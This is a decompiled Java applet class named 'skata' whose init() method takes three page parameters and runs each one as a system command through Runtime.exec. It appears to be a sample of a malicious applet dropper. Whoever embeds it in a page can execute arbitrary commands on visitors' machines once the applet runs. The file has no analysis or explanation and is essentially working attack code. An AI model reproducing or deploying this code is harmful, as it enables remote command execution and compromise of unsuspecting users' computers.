import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class skata extends Applet
{
    public void init() {
        final String parameter = this.getParameter("first");
        try {
            Runtime.getRuntime().exec(parameter);
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
        final String parameter2 = this.getParameter("second");
        try {
            Runtime.getRuntime().exec(parameter2);
        }
        catch (IOException ex2) {
            ex2.printStackTrace();
        }
        final String parameter3 = this.getParameter("third");
        try {
            Runtime.getRuntime().exec(parameter3);
        }
        catch (IOException ex3) {
            ex3.printStackTrace();
        }
    }
}
